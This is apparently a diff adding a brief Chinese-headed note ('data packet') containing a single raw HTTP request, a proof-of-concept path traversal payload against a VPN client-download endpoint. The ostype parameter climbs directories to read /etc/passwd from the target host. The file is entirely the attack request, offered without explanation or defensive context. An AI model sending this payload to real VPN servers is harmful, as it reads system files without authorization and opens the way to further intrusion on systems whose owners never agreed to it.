@@ -1,0 +1,9 @@
+##数据包
+
+
+GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
+Host: 11.11.11.11
+User-Agent: User-AgentMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Connection: close
+Accept-Encoding: gzip, deflate
+
